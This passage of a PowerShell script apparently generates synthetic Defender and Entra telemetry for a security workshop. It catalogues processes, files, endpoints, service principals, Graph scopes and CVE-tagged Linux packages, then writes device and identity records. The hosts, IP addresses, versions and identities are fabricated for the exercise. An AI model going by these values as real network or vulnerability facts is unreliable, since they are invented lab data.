    [pscustomobject]@{ File = 'SSMS.exe'; Path = 'C:\Program Files (x86)\Microsoft SQL Server Management Studio 20\Common7\IDE\Ssms.exe'; Parent = 'explorer.exe'; Command = 'SSMS.exe -nosplash' },
    [pscustomobject]@{ File = 'Tableau.exe'; Path = 'C:\Program Files\Tableau\Tableau 2024.3\bin\Tableau.exe'; Parent = 'explorer.exe'; Command = 'Tableau.exe --safe-mode' },
    [pscustomobject]@{ File = 'PBIDesktop.exe'; Path = 'C:\Program Files\Microsoft Power BI Desktop\bin\PBIDesktop.exe'; Parent = 'explorer.exe'; Command = 'PBIDesktop.exe' },
    [pscustomobject]@{ File = 'Wireshark.exe'; Path = 'C:\Program Files\Wireshark\Wireshark.exe'; Parent = 'explorer.exe'; Command = 'Wireshark.exe -k' },
    [pscustomobject]@{ File = 'Procmon64.exe'; Path = 'C:\Tools\Sysinternals\Procmon64.exe'; Parent = 'explorer.exe'; Command = 'Procmon64.exe /Quiet' },
    [pscustomobject]@{ File = '7zFM.exe'; Path = 'C:\Program Files\7-Zip\7zFM.exe'; Parent = 'explorer.exe'; Command = '7zFM.exe' },
    [pscustomobject]@{ File = 'OktaVerify.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Programs\OktaVerify\OktaVerify.exe'; Parent = 'explorer.exe'; Command = 'OktaVerify.exe --background' }
)
$linuxProcessTemplates = @(
    [pscustomobject]@{ File = 'systemd'; Path = '/usr/lib/systemd/systemd'; Parent = 'kernel'; Command = '/usr/lib/systemd/systemd --system' },
    [pscustomobject]@{ File = 'sshd'; Path = '/usr/sbin/sshd'; Parent = 'systemd'; Command = 'sshd: {0} [priv]' },
    [pscustomobject]@{ File = 'bash'; Path = '/usr/bin/bash'; Parent = 'sshd'; Command = '-bash' },
    [pscustomobject]@{ File = 'sudo'; Path = '/usr/bin/sudo'; Parent = 'bash'; Command = 'sudo -l' },
    [pscustomobject]@{ File = 'apt'; Path = '/usr/bin/apt'; Parent = 'bash'; Command = 'apt list --upgradable' },
    [pscustomobject]@{ File = 'dpkg'; Path = '/usr/bin/dpkg'; Parent = 'apt'; Command = 'dpkg --status openssh-server' },
    [pscustomobject]@{ File = 'auditd'; Path = '/usr/sbin/auditd'; Parent = 'systemd'; Command = '/usr/sbin/auditd -n' },
    [pscustomobject]@{ File = 'mdatp'; Path = '/opt/microsoft/mdatp/sbin/mdatp'; Parent = 'systemd'; Command = 'mdatp health --field healthy' },
    [pscustomobject]@{ File = 'rsyslogd'; Path = '/usr/sbin/rsyslogd'; Parent = 'systemd'; Command = '/usr/sbin/rsyslogd -n -iNONE' },
    [pscustomobject]@{ File = 'cron'; Path = '/usr/sbin/cron'; Parent = 'systemd'; Command = '/usr/sbin/cron -f' }
) + @(
    [pscustomobject]@{ File = 'kthreadd'; Path = '/proc/2/comm'; Parent = 'kernel'; Command = '[kthreadd]' },
    [pscustomobject]@{ File = 'kworker'; Path = '/proc/15/comm'; Parent = 'kthreadd'; Command = '[kworker/0:1-events]' },
    [pscustomobject]@{ File = 'ksoftirqd'; Path = '/proc/16/comm'; Parent = 'kthreadd'; Command = '[ksoftirqd/0]' },
    [pscustomobject]@{ File = 'migration'; Path = '/proc/17/comm'; Parent = 'kthreadd'; Command = '[migration/0]' },
    [pscustomobject]@{ File = 'rcu_sched'; Path = '/proc/18/comm'; Parent = 'kthreadd'; Command = '[rcu_sched]' },
    [pscustomobject]@{ File = 'watchdog'; Path = '/proc/19/comm'; Parent = 'kthreadd'; Command = '[watchdog/0]' },
    [pscustomobject]@{ File = 'irqbalance'; Path = '/usr/sbin/irqbalance'; Parent = 'systemd'; Command = '/usr/sbin/irqbalance --foreground' },
    [pscustomobject]@{ File = 'systemd-journald'; Path = '/usr/lib/systemd/systemd-journald'; Parent = 'systemd'; Command = '/usr/lib/systemd/systemd-journald' },
    [pscustomobject]@{ File = 'systemd-logind'; Path = '/usr/lib/systemd/systemd-logind'; Parent = 'systemd'; Command = '/usr/lib/systemd/systemd-logind' },
    [pscustomobject]@{ File = 'systemd-resolved'; Path = '/usr/lib/systemd/systemd-resolved'; Parent = 'systemd'; Command = '/usr/lib/systemd/systemd-resolved' },
    [pscustomobject]@{ File = 'systemd-timesyncd'; Path = '/usr/lib/systemd/systemd-timesyncd'; Parent = 'systemd'; Command = '/usr/lib/systemd/systemd-timesyncd' },
    [pscustomobject]@{ File = 'NetworkManager'; Path = '/usr/sbin/NetworkManager'; Parent = 'systemd'; Command = '/usr/sbin/NetworkManager --no-daemon' },
    [pscustomobject]@{ File = 'dbus-daemon'; Path = '/usr/bin/dbus-daemon'; Parent = 'systemd'; Command = '/usr/bin/dbus-daemon --system' },
    [pscustomobject]@{ File = 'snapd'; Path = '/usr/lib/snapd/snapd'; Parent = 'systemd'; Command = '/usr/lib/snapd/snapd' },
    [pscustomobject]@{ File = 'unattended-upgrade'; Path = '/usr/bin/unattended-upgrade'; Parent = 'systemd'; Command = '/usr/bin/python3 /usr/bin/unattended-upgrade --download-only' },
    [pscustomobject]@{ File = 'cloud-init'; Path = '/usr/bin/cloud-init'; Parent = 'systemd'; Command = '/usr/bin/python3 /usr/bin/cloud-init modules --mode=final' },
    [pscustomobject]@{ File = 'python3'; Path = '/usr/bin/python3'; Parent = 'bash'; Command = 'python3 /opt/scripts/healthcheck.py' },
    [pscustomobject]@{ File = 'perl'; Path = '/usr/bin/perl'; Parent = 'bash'; Command = 'perl /usr/share/debconf/frontend' },
    [pscustomobject]@{ File = 'curl'; Path = '/usr/bin/curl'; Parent = 'bash'; Command = 'curl -fsSL https://packages.microsoft.com/config/ubuntu/24.04/prod.list' },
    [pscustomobject]@{ File = 'wget'; Path = '/usr/bin/wget'; Parent = 'bash'; Command = 'wget -q https://archive.ubuntu.com/ubuntu/dists/noble/InRelease' },
    [pscustomobject]@{ File = 'grep'; Path = '/usr/bin/grep'; Parent = 'bash'; Command = 'grep -R sudo /var/log/auth.log' },
    [pscustomobject]@{ File = 'awk'; Path = '/usr/bin/awk'; Parent = 'bash'; Command = 'awk {print $1} /var/log/auth.log' },
    [pscustomobject]@{ File = 'sed'; Path = '/usr/bin/sed'; Parent = 'bash'; Command = 'sed -n 1,40p /etc/ssh/sshd_config' },
    [pscustomobject]@{ File = 'tar'; Path = '/usr/bin/tar'; Parent = 'bash'; Command = 'tar -czf /tmp/logs.tgz /var/log' },
    [pscustomobject]@{ File = 'gzip'; Path = '/usr/bin/gzip'; Parent = 'tar'; Command = 'gzip -6 /tmp/logs.tar' },
    [pscustomobject]@{ File = 'journalctl'; Path = '/usr/bin/journalctl'; Parent = 'bash'; Command = 'journalctl -u ssh --since today' },
    [pscustomobject]@{ File = 'nginx'; Path = '/usr/sbin/nginx'; Parent = 'systemd'; Command = 'nginx: worker process' },
    [pscustomobject]@{ File = 'apache2'; Path = '/usr/sbin/apache2'; Parent = 'systemd'; Command = '/usr/sbin/apache2 -k start' },
    [pscustomobject]@{ File = 'mysqld'; Path = '/usr/sbin/mysqld'; Parent = 'systemd'; Command = '/usr/sbin/mysqld --daemonize' },
    [pscustomobject]@{ File = 'tnslsnr'; Path = '/opt/oracle/product/23ai/dbhomeFree/bin/tnslsnr'; Parent = 'systemd'; Command = 'tnslsnr LISTENER -inherit' }
)
$windowsFileTemplates = @(
    [pscustomobject]@{ Name = 'settings.json'; PathTemplate = 'C:\Users\{0}\AppData\Roaming\Microsoft\Teams\settings.json'; Size = 8192 },
    [pscustomobject]@{ Name = 'cache.db'; PathTemplate = 'C:\Users\{0}\AppData\Local\Microsoft\Edge\User Data\Default\Cache\cache.db'; Size = 262144 },
    [pscustomobject]@{ Name = 'document.docx'; PathTemplate = 'C:\Users\{0}\Documents\Operations\document.docx'; Size = 153600 },
    [pscustomobject]@{ Name = 'DefenderUpdate.log'; Path = 'C:\ProgramData\Microsoft\Windows Defender\Support\DefenderUpdate.log'; Size = 32768 }
) + @(New-WorkshopWindowsFileTemplateCatalog -Count 100)
$linuxFileTemplates = @(
    [pscustomobject]@{ Name = 'auth.log'; Path = '/var/log/auth.log'; Size = 65536 },
    [pscustomobject]@{ Name = 'audit.log'; Path = '/var/log/audit/audit.log'; Size = 131072 },
    [pscustomobject]@{ Name = 'syslog'; Path = '/var/log/syslog'; Size = 196608 },
    [pscustomobject]@{ Name = 'kern.log'; Path = '/var/log/kern.log'; Size = 65536 },
    [pscustomobject]@{ Name = 'sshd_config'; Path = '/etc/ssh/sshd_config'; Size = 4096 },
    [pscustomobject]@{ Name = 'sudoers'; Path = '/etc/sudoers'; Size = 6144 },
    [pscustomobject]@{ Name = 'status'; Path = '/var/lib/dpkg/status'; Size = 524288 },
    [pscustomobject]@{ Name = 'mdatp_managed.json'; Path = '/etc/opt/microsoft/mdatp/managed/mdatp_managed.json'; Size = 4096 },
    [pscustomobject]@{ Name = 'unattended-upgrades.log'; Path = '/var/log/unattended-upgrades/unattended-upgrades.log'; Size = 32768 },
    [pscustomobject]@{ Name = 'bash_history'; PathTemplate = '/home/{0}/.bash_history'; Size = 8192 }
)
$windowsDllTemplates = @(
    [pscustomobject]@{ Name = 'samlib.dll'; Path = 'C:\Windows\System32\samlib.dll'; Size = 176128 },
    [pscustomobject]@{ Name = 'sechost.dll'; Path = 'C:\Windows\System32\sechost.dll'; Size = 761856 },
    [pscustomobject]@{ Name = 'winhttp.dll'; Path = 'C:\Windows\System32\winhttp.dll'; Size = 1089536 },
    [pscustomobject]@{ Name = 'crypt32.dll'; Path = 'C:\Windows\System32\crypt32.dll'; Size = 1869824 }
) + @(New-WorkshopWindowsDllTemplateCatalog -Count 100)
$linuxSharedObjectTemplates = @(
    [pscustomobject]@{ Name = 'libc.so.6'; Path = '/lib/x86_64-linux-gnu/libc.so.6'; Size = 2216304 },
    [pscustomobject]@{ Name = 'libpam.so.0'; Path = '/lib/x86_64-linux-gnu/libpam.so.0'; Size = 67584 },
    [pscustomobject]@{ Name = 'libssl.so.3'; Path = '/usr/lib/x86_64-linux-gnu/libssl.so.3'; Size = 688160 },
    [pscustomobject]@{ Name = 'libcrypto.so.3'; Path = '/usr/lib/x86_64-linux-gnu/libcrypto.so.3'; Size = 4730136 },
    [pscustomobject]@{ Name = 'libsystemd.so.0'; Path = '/usr/lib/x86_64-linux-gnu/libsystemd.so.0'; Size = 856432 },
    [pscustomobject]@{ Name = 'libaudit.so.1'; Path = '/usr/lib/x86_64-linux-gnu/libaudit.so.1'; Size = 137520 },
    [pscustomobject]@{ Name = 'libnss_files.so.2'; Path = '/lib/x86_64-linux-gnu/libnss_files.so.2'; Size = 55936 }
) + @(New-WorkshopLinuxSharedObjectTemplateCatalog -Count 100)
$windowsRemoteEndpoints = @(
    [pscustomobject]@{ Url = 'login.microsoftonline.com'; IP = '20.190.160.10'; Port = 443 },
    [pscustomobject]@{ Url = 'graph.microsoft.com'; IP = '20.190.128.12'; Port = 443 },
    [pscustomobject]@{ Url = 'officecdn.microsoft.com'; IP = '13.107.246.40'; Port = 443 },
    [pscustomobject]@{ Url = 'wdcp.microsoft.com'; IP = '52.152.110.14'; Port = 443 },
    [pscustomobject]@{ Url = 'packages.microsoft.com'; IP = '13.107.246.45'; Port = 443 }
) + @(New-WorkshopRemoteEndpointCatalog -Prefix 'win-saas' -Domain 'workshop.example' -IpPrefix '203.0.113' -Ports @(443, 80, 8443, 8080, 22, 1433, 3389, 9418) -Protocols @('Tcp') -Count 200)
$linuxRemoteEndpoints = @(
    [pscustomobject]@{ Url = 'packages.microsoft.com'; IP = '13.107.246.45'; Port = 443; Protocol = 'Tcp' },
    [pscustomobject]@{ Url = 'archive.ubuntu.com'; IP = '91.189.91.82'; Port = 443; Protocol = 'Tcp' },
    [pscustomobject]@{ Url = 'security.ubuntu.com'; IP = '91.189.91.83'; Port = 443; Protocol = 'Tcp' },
    [pscustomobject]@{ Url = 'ntp.ubuntu.com'; IP = '91.189.89.198'; Port = 123; Protocol = 'Udp' },
    [pscustomobject]@{ Url = 'print-gw01.usag-cyber.local'; IP = '10.42.20.15'; Port = 631; Protocol = 'Udp' },
    [pscustomobject]@{ Url = 'admin-jump01.usag-cyber.local'; IP = '10.42.30.10'; Port = 22; Protocol = 'Tcp' }
)
$linuxRemoteEndpoints += @(New-WorkshopRemoteEndpointCatalog -Prefix 'linux-repo' -Domain 'workshop.example' -IpPrefix '192.0.2' -Ports @(443, 80, 22, 123, 53, 514, 631, 1521, 8080, 9092) -Protocols @('Tcp', 'Tcp', 'Tcp', 'Udp', 'Udp') -Count 200)
$deviceNetworkEventsSamplePath = Join-Path $PSScriptRoot '..\sample\DeviceNetworkEvents-Real.csv'
$deviceNetworkEventProfiles = @(Import-WorkshopDeviceNetworkEventProfileCatalog -Path $deviceNetworkEventsSamplePath)
$deviceInfoSamplePath = Join-Path $PSScriptRoot '..\sample\DeviceInfo-RealTelemetry.csv'
$deviceInfoProfiles = @(Import-WorkshopDeviceInfoProfileCatalog -Path $deviceInfoSamplePath)
$deviceInfoWindows11Profiles = @($deviceInfoProfiles | Where-Object { $_.OSPlatform -eq 'Windows11' -and $_.DeviceType -eq 'Workstation' })
$deviceInfoServerProfiles = @($deviceInfoProfiles | Where-Object { $_.OSPlatform -like 'WindowsServer*' -and $_.DeviceType -eq 'Server' })
$deviceInfoLinuxProfiles = @($deviceInfoProfiles | Where-Object { $_.OSPlatform -eq 'Linux' -or $_.OSDistribution -eq 'Ubuntu' })

$linuxSoftwareInventoryPath = Join-Path $PSScriptRoot '..\sample\export-tvm-machine-software-inventory-linux.csv'
$linuxSoftwareCatalog = @(
    [pscustomobject]@{ Name = 'openssh-server'; Vendor = 'OpenBSD'; Version = '1:9.6p1-3ubuntu13.5'; CveId = 'CVE-2024-6387'; Package = 'openssh-server'; Risk = 88 },
    [pscustomobject]@{ Name = 'cups'; Vendor = 'OpenPrinting'; Version = '2.4.7-1.2ubuntu7.3'; CveId = 'CVE-2024-47176'; Package = 'cups-browsed'; Risk = 74 },
    [pscustomobject]@{ Name = 'sudo'; Vendor = 'Sudo Project'; Version = '1.9.15p5-3ubuntu5.24.04.1'; CveId = 'CVE-2025-32463'; Package = 'sudo'; Risk = 82 },
    [pscustomobject]@{ Name = 'glibc'; Vendor = 'GNU C Library'; Version = '2.39-0ubuntu8.4'; CveId = 'CVE-2023-4911'; Package = 'libc6'; Risk = 70 },
    [pscustomobject]@{ Name = 'linux-image'; Vendor = 'Canonical'; Version = '6.8.0-58-generic'; CveId = 'CVE-2024-53197'; Package = 'linux-image-generic'; Risk = 67 },
    [pscustomobject]@{ Name = 'openssl'; Vendor = 'OpenSSL Software Foundation'; Version = '3.0.13-0ubuntu3.5'; CveId = 'CVE-2024-5535'; Package = 'openssl'; Risk = 55 },
    [pscustomobject]@{ Name = 'bash'; Vendor = 'GNU Project'; Version = '5.2.21-2ubuntu4'; CveId = 'CVE-2014-6271'; Package = 'bash'; Risk = 45 },
    [pscustomobject]@{ Name = 'mdatp'; Vendor = 'Microsoft'; Version = '101.25042.0000'; CveId = ''; Package = 'mdatp'; Risk = 10 }
) + @(Import-WorkshopTvmSoftwareCatalog -Path $linuxSoftwareInventoryPath -MinimumCount 400)
$normalApplications = @(
    [pscustomobject]@{ Name = 'Microsoft Teams'; Id = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; Resource = 'Microsoft Graph' },
    [pscustomobject]@{ Name = 'Office 365 Exchange Online'; Id = '00000002-0000-0ff1-ce00-000000000000'; Resource = 'Office 365 Exchange Online' },
    [pscustomobject]@{ Name = 'Microsoft Azure PowerShell'; Id = '1950a258-227b-4e31-a9cf-717495945fc2'; Resource = 'Azure Resource Manager' },
    [pscustomobject]@{ Name = 'Windows Sign In'; Id = '38aa3b87-a06d-4817-b275-7a316988d93b'; Resource = 'Microsoft Entra ID' }
)
$servicePrincipalNames = @(
    'Backup Vault Managed Identity', 'Azure Automation Runbook', 'USAG Cyber Sync Helper', 'Defender Export Connector', 'Sentinel SOAR Playbook', 'Logic App Incident Router', 'Key Vault Rotation Worker', 'Storage Lifecycle Manager',
    'Arc Server Onboarding', 'AKS Workload Identity', 'Container Registry Puller', 'Data Factory Pipeline Runner', 'Event Hub Capture Writer', 'Function App Telemetry Collector', 'Graph Compliance Reader', 'Intune Device Sync',
    'M365 Usage Reporter', 'MDI Sensor Deployment', 'MDE Device Tagger', 'Privileged Access Review Bot', 'SharePoint Migration Worker', 'Teams Recording Processor', 'Virtual Machine Patch Agent', 'Windows Update Compliance Exporter',
    'Oracle Backup Exporter', 'Linux Package Inventory Collector', 'ServiceNow Ticket Sync', 'CMDB Asset Importer', 'Power BI Dataset Refresher', 'Azure Monitor Workbook Publisher', 'Policy Remediation Task', 'Certificate Expiry Watcher',
    'Conditional Access Reporter', 'PIM Eligibility Auditor', 'Terraform Deployment Principal', 'Bicep WhatIf Runner', 'GitHub Actions OIDC Principal', 'DevOps Release Service Connection', 'Database Credential Scanner', 'Storage Malware Scan Worker',
    'Purview Label Synchronizer', 'Exchange Transport Rule Auditor', 'Hybrid Identity Health Agent', 'Cloud App Discovery Uploader', 'Vulnerability Intake Processor', 'Security Score Exporter', 'Workshop Managed Identity'
)
$servicePrincipalSignInCatalog = for ($i = 0; $i -lt $servicePrincipalNames.Count; $i++) {
    [pscustomobject]@{
        Name = $servicePrincipalNames[$i]
        Seed = 'spn-app|{0:D2}|{1}' -f $i, $servicePrincipalNames[$i]
    }
}
$servicePrincipalResourceCatalog = @(
    [pscustomobject]@{ Name = 'Microsoft Graph'; Id = '00000003-0000-0000-c000-000000000000' },
    [pscustomobject]@{ Name = 'Azure Resource Manager'; Id = '797f4846-ba00-4fd7-ba43-dac1f8f63013' },
    [pscustomobject]@{ Name = 'Azure Key Vault'; Id = New-StableGuid 'resource|key-vault' },
    [pscustomobject]@{ Name = 'Azure Storage'; Id = New-StableGuid 'resource|storage' },
    [pscustomobject]@{ Name = 'Microsoft Sentinel'; Id = New-StableGuid 'resource|sentinel' },
    [pscustomobject]@{ Name = 'Microsoft Defender XDR'; Id = New-StableGuid 'resource|defender-xdr' },
    [pscustomobject]@{ Name = 'Office 365 Exchange Online'; Id = '00000002-0000-0ff1-ce00-000000000000' },
    [pscustomobject]@{ Name = 'SharePoint Online'; Id = New-StableGuid 'resource|sharepoint-online' },
    [pscustomobject]@{ Name = 'Azure Monitor'; Id = New-StableGuid 'resource|azure-monitor' },
    [pscustomobject]@{ Name = 'Azure Kubernetes Service'; Id = New-StableGuid 'resource|aks' },
    [pscustomobject]@{ Name = 'Azure Container Registry'; Id = New-StableGuid 'resource|acr' },
    [pscustomobject]@{ Name = 'Azure SQL Database'; Id = New-StableGuid 'resource|azure-sql' },
    [pscustomobject]@{ Name = 'Microsoft Purview'; Id = New-StableGuid 'resource|purview' },
    [pscustomobject]@{ Name = 'Azure Automation'; Id = New-StableGuid 'resource|automation' }
)
$managedIdentityResourceCatalog = @(
    [pscustomobject]@{ Name = 'vm-aadconnect-sync-01'; ResourceGroup = 'rg-identity-tier0'; Provider = 'Microsoft.Compute/virtualMachines'; Region = 'Germany West Central'; PrivateIp = '10.42.0.20'; IdentityType = 'SystemAssigned'; UserAgent = 'ImdsIdentityProvider/150.870.65.1854' },
    [pscustomobject]@{ Name = 'func-telemetry-collector'; ResourceGroup = 'rg-security-automation'; Provider = 'Microsoft.Web/sites'; Region = 'Germany West Central'; PrivateIp = '10.42.40.12'; IdentityType = 'SystemAssigned'; UserAgent = 'azsdk-net-Identity/1.13.2 (.NET 8.0.6; Microsoft Windows 10.0.20348)' },
    [pscustomobject]@{ Name = 'auto-patch-orchestrator'; ResourceGroup = 'rg-operations'; Provider = 'Microsoft.Automation/automationAccounts'; Region = 'West Europe'; PrivateIp = '10.42.40.23'; IdentityType = 'UserAssigned'; UserAgent = 'azsdk-net-Identity/1.12.1 (.NET 6.0.36; Microsoft Windows 10.0.20348)' },
    [pscustomobject]@{ Name = 'aks-workload-inventory'; ResourceGroup = 'rg-containers'; Provider = 'Microsoft.ContainerService/managedClusters'; Region = 'Germany West Central'; PrivateIp = '10.42.50.15'; IdentityType = 'UserAssigned'; UserAgent = 'Go-http-client/1.1' },
    [pscustomobject]@{ Name = 'logicapp-incident-router'; ResourceGroup = 'rg-sentinel-soar'; Provider = 'Microsoft.Logic/workflows'; Region = 'West Europe'; PrivateIp = '10.42.40.44'; IdentityType = 'SystemAssigned'; UserAgent = 'azsdk-net-Identity/1.11.0 (.NET 6.0.36; Microsoft Windows 10.0.20348)' },
    [pscustomobject]@{ Name = 'vm-linux-inventory-01'; ResourceGroup = 'rg-linux-servers'; Provider = 'Microsoft.Compute/virtualMachines'; Region = 'Germany West Central'; PrivateIp = '10.42.20.31'; IdentityType = 'SystemAssigned'; UserAgent = 'Azure-Identity/1.15.0 Python/3.12.3' },
    [pscustomobject]@{ Name = 'datafactory-export-runner'; ResourceGroup = 'rg-data-platform'; Provider = 'Microsoft.DataFactory/factories'; Region = 'North Europe'; PrivateIp = '10.42.60.18'; IdentityType = 'UserAssigned'; UserAgent = 'azsdk-java-identity/1.14.0' },
    [pscustomobject]@{ Name = 'app-purview-label-sync'; ResourceGroup = 'rg-compliance'; Provider = 'Microsoft.Web/sites'; Region = 'West Europe'; PrivateIp = '10.42.40.61'; IdentityType = 'SystemAssigned'; UserAgent = 'azsdk-net-Identity/1.13.2 (.NET 8.0.6; Microsoft Windows 10.0.20348)' },
    [pscustomobject]@{ Name = 'vm-oracle-backup-01'; ResourceGroup = 'rg-database'; Provider = 'Microsoft.Compute/virtualMachines'; Region = 'Germany West Central'; PrivateIp = '10.42.20.35'; IdentityType = 'SystemAssigned'; UserAgent = 'ImdsIdentityProvider/150.870.65.1854' },
    [pscustomobject]@{ Name = 'func-keyvault-rotation'; ResourceGroup = 'rg-key-management'; Provider = 'Microsoft.Web/sites'; Region = 'Germany West Central'; PrivateIp = '10.42.40.72'; IdentityType = 'UserAssigned'; UserAgent = 'azsdk-js-identity/4.4.1 core-rest-pipeline/1.17.0 Node/20.11.1' }
)
$servicePrincipalLocationCatalog = @(
    [pscustomobject]@{ Country = 'DE'; State = 'Hesse'; City = 'Wiesbaden'; Latitude = '50.0782'; Longitude = '8.2398' },
    [pscustomobject]@{ Country = 'DE'; State = 'Hesse'; City = 'Frankfurt am Main'; Latitude = '50.1109'; Longitude = '8.6821' },
    [pscustomobject]@{ Country = 'DE'; State = 'Bavaria'; City = 'Munich'; Latitude = '48.1351'; Longitude = '11.5820' },
    [pscustomobject]@{ Country = 'DE'; State = 'Berlin'; City = 'Berlin'; Latitude = '52.5200'; Longitude = '13.4050' },
    [pscustomobject]@{ Country = 'DE'; State = 'Hamburg'; City = 'Hamburg'; Latitude = '53.5511'; Longitude = '9.9937' },
    [pscustomobject]@{ Country = 'DE'; State = 'North Rhine-Westphalia'; City = 'Cologne'; Latitude = '50.9375'; Longitude = '6.9603' }
)
$servicePrincipalUserAgents = @(
    'ImdsIdentityProvider/150.870.65.1854',
    'azsdk-net-Identity/1.13.2 (.NET 6.0.36; Microsoft Windows 10.0.20348)',
    'Go-http-client/1.1',
    'azsdk-net-Identity/1.12.1 (.NET 6.0.36; Microsoft Windows 10.0.20348)',
    'azsdk-net-Identity/1.11.0 (.NET 6.0.36; Microsoft Windows 10.0.20348)'
)
$servicePrincipalGatewayJa4Catalog = for ($i = 1; $i -le 16; $i++) {
    't13d{0:D4}h2_{1}_{2}' -f $i, (New-StableHex "spn-ja4-left|$i" 12), (New-StableHex "spn-ja4-right|$i" 12)
}
$graphAuditRegions = @(
    'East US 2', 'East US 2', 'East US 2', 'Central US', 'West US', 'East US', 'South Central US', 'North Central US',
    'West Europe', 'Germany West Central', 'West US 3', 'West US 2', 'West Central US', 'France Central',
    'North Europe', 'Italy North', 'Switzerland North', 'UK South', 'Japan East'
)
$graphAuditWorkloads = @(
    'Microsoft.Identity.AuxiliaryStore',
    'Microsoft.DataClassificationService',
    'Microsoft.ESTS',
    'Microsoft.People',
    'Microsoft.FileServices',
    'Microsoft.IdentityProtectionServices',
    'Microsoft.Intune.Rbac',
    'Microsoft.MCP.Enterprise',
    'Microsoft.O365Reporting',
    'Microsoft.PIM.AzureRBAC',
    'Microsoft.SharePoint',
    'Microsoft.Teams'
)
$graphAuditRequestTemplates = @(
    'https://graph.microsoft.com/{0}/users/{1}',
    'https://graph.microsoft.com/{0}/organization?$select=displayName',
    'https://graph.microsoft.com/{0}/subscribedSkus',
    'https://graph.microsoft.com/{0}/$batch',
    'https://graph.microsoft.com/beta/dataClassification/classifyText',
    'https://graph.microsoft.com/{0}/directory/subscriptions',
    'https://graph.microsoft.com/{0}/identity/conditionalAccess/policies',
    'https://graph.microsoft.com/{0}/me/photo/$Value',
    'https://graph.microsoft.com/{0}/roleManagement/directory/roleAssignments',
    'https://graph.microsoft.com/{0}/groups/{1}/members',
    'https://graph.microsoft.com/{0}/security/alerts_v2',
    'https://graph.microsoft.com/{0}/deviceManagement/managedDevices',
    'https://graph.microsoft.com/{0}/reports/getOffice365ActiveUserDetail(period=''D7'')',
    'https://graph.microsoft.com/{0}/organization/{1}',
    'https://graph.microsoft.com/beta/me/drive/root/children'
)
$graphAuditScopeTemplates = @(
    'email openid profile User.Read',
    'Directory.Read.All email Group.Read.All Organization.Read.All profile User.ReadBasic.All',
    'Calendars.Read Contacts.Read email Files.ReadWrite.All GroupMember.Read.All openid profile User.Read',
    'DeviceManagementConfiguration.Read.All DeviceManagementConfiguration.ReadWrite.All Directory.Read.All email Group.Read.All',
    'IdentityRiskEvent.Read.All IdentityRiskyUser.ReadWrite.All openid profile User.Read',
    'AuditLog.Read.All Directory.Read.All RoleManagement.Read.Directory User.Read.All',
    'CloudPC.Read.All CloudPC.ReadWrite.All DeviceManagementApps.ReadWrite.All',
    'Files.Read Files.Read.All Files.ReadWrite Mail.Read openid profile Sites.Read.All',
    'Policy.Read.All Policy.ReadWrite.ConditionalAccess SecurityEvents.Read.All',
    'Team.ReadBasic.All Channel.ReadBasic.All Chat.Read Chat.ReadWrite'
)

Assert-WorkshopCatalogMinimum -Name 'First names' -Items $firstNames -Minimum 126
Assert-WorkshopCatalogMinimum -Name 'Last names' -Items $lastNames -Minimum 134
Assert-WorkshopCatalogMinimum -Name 'Windows process templates' -Items $windowsProcessTemplates -Minimum 55
Assert-WorkshopCatalogMinimum -Name 'Linux process templates' -Items $linuxProcessTemplates -Minimum 40
Assert-WorkshopCatalogMinimum -Name 'Windows file templates' -Items $windowsFileTemplates -Minimum 104
Assert-WorkshopCatalogMinimum -Name 'Windows DLL templates' -Items $windowsDllTemplates -Minimum 104
Assert-WorkshopCatalogMinimum -Name 'Linux shared object templates' -Items $linuxSharedObjectTemplates -Minimum 107
Assert-WorkshopCatalogMinimum -Name 'Windows remote endpoints' -Items $windowsRemoteEndpoints -Minimum 205
Assert-WorkshopCatalogMinimum -Name 'Linux remote endpoints' -Items $linuxRemoteEndpoints -Minimum 206
Assert-WorkshopCatalogMinimum -Name 'DeviceNetworkEvents real profiles' -Items $deviceNetworkEventProfiles -Minimum 2000
Assert-WorkshopCatalogMinimum -Name 'Linux software catalog' -Items $linuxSoftwareCatalog -Minimum 408

foreach ($device in $devices) {
    $deviceIndex = [array]::IndexOf($devices, $device) + 1
    $deviceUser = if ($device.ShortName -eq 'WIN11-04') { $victor } elseif ($device.OS -eq 'Ubuntu') { $svcSql } else { $users[$deviceIndex % $users.Count] }
    Add-Record -Table 'DeviceInfo' -Time $StartTime.AddMinutes(-30) -Values (New-WorkshopDeviceInfoValues -Device $device -Time $StartTime.AddMinutes(-30) -Index $deviceIndex -User $deviceUser)

    Add-Record -Table 'DeviceNetworkInfo' -Time $StartTime.AddMinutes(-29) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-29)
        DeviceId = $device.DeviceId
        DeviceName = $device.Name
        NetworkAdapterName = if ($device.OS -eq 'Ubuntu') { 'ens160' } else { 'Ethernet0' }
        ConnectedNetworks = if ($device.OS -eq 'Ubuntu') { '[{"Name":"CorpLinux","Category":"Private"}]' } else { '[{"Name":"CorpNet","Category":"DomainAuthenticated"}]' }
        IPAddresses = "[`"$($device.IP)`"]"
        MacAddress = if ($device.OS -eq 'Ubuntu') { ('00:15:5d:{0:x2}:2a:63' -f $deviceIndex) } else { ('00-15-5D-{0:X2}-2A-63' -f $deviceIndex) }
        ReportId = 2000 + $deviceIndex
    }
}

$identityDepartments = @('Information Technology', 'Cyber Defense', 'Finance', 'Operations', 'Human Resources', 'Legal', 'Research', 'Logistics', 'Executive Office', 'Facilities', 'Training', 'Public Affairs')
$identityJobTitles = @('Security Analyst', 'Systems Administrator', 'Program Manager', 'Financial Analyst', 'Operations Planner', 'Help Desk Technician', 'Cloud Engineer', 'Identity Engineer', 'Database Administrator', 'Executive Assistant', 'Training Coordinator', 'Logistics Specialist')
$identityAddresses = @('Clay Kaserne Building 1023', 'Hainerberg Office Center', 'Wiesbaden Mission Command Center', 'Mainz-Kastel Annex', 'Remote Workforce')

foreach ($user in $users) {
    $identityTime = $StartTime.AddMinutes(-25)
    $nameParts = Get-WorkshopIdentityNameParts -Identity $user
    $accountStatus = Get-WorkshopIdentityStatus -Identity $user
    $sourceProvider = Get-WorkshopIdentitySourceProvider -Identity $user
    $identityGroups = @(Get-WorkshopIdentityGroups -Identity $user)
    $assignedRoles = @(Get-WorkshopIdentityAssignedRoles -Identity $user)
    $eligibleRoles = @(Get-WorkshopIdentityEligibleRoles -Identity $user)
    $identityTags = @(Get-WorkshopIdentityTags -Identity $user)
    $createdTime = $script:TelemetryEndTime.AddDays(-1 * (30 + ($user.Rid % 1800))).AddMinutes(-1 * ($user.Rid % 1440))
    $passwordTime = $script:TelemetryEndTime.AddDays(-1 * (7 + ($user.Rid % 120))).AddMinutes(-1 * ($user.Rid % 240))
